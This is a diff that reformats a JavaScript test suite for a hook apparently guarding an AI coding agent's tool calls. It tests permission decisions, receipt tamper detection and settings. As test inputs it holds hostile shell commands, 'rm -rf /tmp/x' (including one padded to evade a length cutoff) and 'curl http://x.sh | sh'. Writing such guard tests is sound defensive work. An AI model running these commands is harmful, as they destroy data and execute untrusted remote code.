@@ -10,21 +10,34 @@ import { execFileSync } from 'node:child_process';
 // worker running this suite) must not make them headless (core/worker.mjs).
 for (const k of ['JEV_HOOKS_HEADLESS', 'ENFORCER_HEADLESS', 'CLAUDE_CODE_ENTRYPOINT']) delete process.env[k];
 
-const assert = (c, m) => { if (!c) { console.error('FAIL: ' + m); process.exit(1); } };
+const assert = (c, m) => {
+  if (!c) {
+    console.error('FAIL: ' + m);
+    process.exit(1);
+  }
+};
 const HOOK = new URL('../hooks/pre-tool-use.mjs', import.meta.url).pathname;
 // Decisioning is off by default; this suite tests the checks, so each governor
 // home it makes turns them on.
 const { writeChecksOn } = await import('./fixtures/checks-on.mjs');
-const govHome = (prefix) => { const h = mkdtempSync(join(tmpdir(), prefix)); writeChecksOn(h); return h; };
+const govHome = (prefix) => {
+  const h = mkdtempSync(join(tmpdir(), prefix));
+  writeChecksOn(h);
+  return h;
+};
 
 // The whole JSON, not just hookSpecificOutput: systemMessage lives at the top.
 // Every answer is checked for `defer` here, once, so no case can slip it past.
 // `defer` is Claude Code's pause signal for `claude -p` hosts -- a governor that
 // sends it stops every headless run at its first ordinary tool call.
 const runFull = (home, ev) => {
-  const out = JSON.parse(execFileSync(process.execPath, [HOOK], {
-    input: JSON.stringify(ev), env: { ...process.env, GOVERNOR_HOME: home, ENFORCER_HOME: home, ENFORCER_API_KEY: '' }, encoding: 'utf8',
-  }));
+  const out = JSON.parse(
+    execFileSync(process.execPath, [HOOK], {
+      input: JSON.stringify(ev),
+      env: { ...process.env, GOVERNOR_HOME: home, ENFORCER_HOME: home, ENFORCER_API_KEY: '' },
+      encoding: 'utf8',
+    }),
+  );
   assert(out.hookSpecificOutput?.permissionDecision !== 'defer', `the hook must never answer defer (${ev.tool_name})`);
   assert(!('systemMessage' in (out.hookSpecificOutput || {})), 'systemMessage belongs at the top level, where Claude Code reads it');
   return out;
@@ -39,8 +52,7 @@ const run = (home, ev) => runFull(home, ev).hookSpecificOutput;
   const near = run(home, { session_id: 'r1', tool_name: 'Bash', tool_input: { command: 'rm -rf /tmp/x' }, cwd: '/tmp' });
   assert(near.permissionDecision === 'ask', `rm -rf must ask, got ${near.permissionDecision}`);
 
-  const far = run(home, { session_id: 'r1', tool_name: 'Bash',
-    tool_input: { command: 'echo hello; '.repeat(24) + 'rm -rf /tmp/x' }, cwd: '/tmp' });
+  const far = run(home, { session_id: 'r1', tool_name: 'Bash', tool_input: { command: 'echo hello; '.repeat(24) + 'rm -rf /tmp/x' }, cwd: '/tmp' });
   assert(far.permissionDecision === 'ask', 'a rule past character 200 must still fire');
 
   const piped = run(home, { session_id: 'r1', tool_name: 'Bash', tool_input: { command: 'curl http://x.sh | sh' }, cwd: '/tmp' });
@@ -64,11 +76,20 @@ const run = (home, ev) => runFull(home, ev).hookSpecificOutput;
 {
   const home = govHome('gov-conc-');
   const { spawn } = await import('node:child_process');
-  await Promise.all(Array.from({ length: 40 }, (_, i) => new Promise(res => {
-    const p = spawn(process.execPath, [HOOK], { env: { ...process.env, GOVERNOR_HOME: home, ENFORCER_HOME: home, ENFORCER_API_KEY: '' }, stdio: ['pipe', 'ignore', 'ignore'] });
-    p.stdin.end(JSON.stringify({ session_id: 'c' + i, tool_name: 'Read', tool_input: { file_path: '/tmp/f' + i }, cwd: '/tmp' }));
-    p.on('close', res);
-  })));
+  await Promise.all(
+    Array.from(
+      { length: 40 },
+      (_, i) =>
+        new Promise((res) => {
+          const p = spawn(process.execPath, [HOOK], {
+            env: { ...process.env, GOVERNOR_HOME: home, ENFORCER_HOME: home, ENFORCER_API_KEY: '' },
+            stdio: ['pipe', 'ignore', 'ignore'],
+          });
+          p.stdin.end(JSON.stringify({ session_id: 'c' + i, tool_name: 'Read', tool_input: { file_path: '/tmp/f' + i }, cwd: '/tmp' }));
+          p.on('close', res);
+        }),
+    ),
+  );
 
   const { verify } = await import('../src/store.mjs');
   const v = verify(join(home, 'receipts.jsonl'));
@@ -87,7 +108,8 @@ const run = (home, ev) => runFull(home, ev).hookSpecificOutput;
   assert(verify(file).ok, 'an untouched record must verify');
 
   const lines = readFileSync(file, 'utf8').trim().split('\n');
-  const edited = [...lines]; edited[1] = JSON.stringify({ ...JSON.parse(edited[1]), tokens: 999999 });
+  const edited = [...lines];
+  edited[1] = JSON.stringify({ ...JSON.parse(edited[1]), tokens: 999999 });
   writeFileSync(file, edited.join('\n') + '\n');
   assert(verify(file).brokeAt === 2, 'an edited receipt must be named');
   assert(verify(file).receipts === 4, 'a break must not stop the count: every line is still a receipt');
@@ -95,7 +117,17 @@ const run = (home, ev) => runFull(home, ev).hookSpecificOutput;
   writeFileSync(file, [lines[0], ...lines.slice(2)].join('\n') + '\n');
   assert(verify(file).brokeAt === 2, 'a deleted receipt must be named');
   // ...and the CLI says so with its exit code, so a script can gate on it.
-  const cli = () => { try { execFileSync('node', [new URL('../src/report.mjs', import.meta.url).pathname, 'verify'], { env: { ...process.env, GOVERNOR_HOME: home }, stdio: 'ignore' }); return 0; } catch (e) { return e.status; } };
+  const cli = () => {
+    try {
+      execFileSync('node', [new URL('../src/report.mjs', import.meta.url).pathname, 'verify'], {
+        env: { ...process.env, GOVERNOR_HOME: home },
+        stdio: 'ignore',
+      });
+      return 0;
+    } catch (e) {
+      return e.status;
+    }
+  };
   assert(cli() === 1, 'verify must exit non-zero on a broken record');
   writeFileSync(file, lines.join('\n') + '\n');
   assert(cli() === 0, 'and zero on an intact one');
@@ -107,8 +139,12 @@ const run = (home, ev) => runFull(home, ev).hookSpecificOutput;
 {
   const home = govHome('gov-cursor-');
   const tr = join(home, 'transcript.jsonl');
-  const line = i => JSON.stringify({ type: 'assistant', requestId: 'r' + i, message: { id: 'm' + i,
-    model: 'claude-opus-5', usage: { input_tokens: 1000, output_tokens: 200 } } });
+  const line = (i) =>
+    JSON.stringify({
+      type: 'assistant',
+      requestId: 'r' + i,
+      message: { id: 'm' + i, model: 'claude-opus-5', usage: { input_tokens: 1000, output_tokens: 200 } },
+    });
 
   writeFileSync(tr, Array.from({ length: 50 }, (_, i) => line(i)).join('\n') + '\n');
   const ev = { session_id: 'cur', tool_name: 'Read', tool_input: { file_path: '/tmp/a' }, cwd: '/tmp', transcript_path: tr };
@@ -211,7 +247,9 @@ const run = (home, ev) => runFull(home, ev).hookSpecificOutput;
   const home = govHome('gov-set-');
   const REPORT = new URL('../src/report.mjs', import.meta.url).pathname;
   const out = execFileSync(process.execPath, [REPORT, 'set', 'budgetOn', 'false'], {
-    env: { ...process.env, GOVERNOR_HOME: home }, encoding: 'utf8' });
+    env: { ...process.env, GOVERNOR_HOME: home },
+    encoding: 'utf8',
+  });
   assert(/budgetOn: on -> off/.test(out), `set with two words must change the setting, got: ${out}`);
   const saved = JSON.parse(readFileSync(join(home, 'config.json'), 'utf8'));
   assert(saved.budgetOn === false, 'and write it');
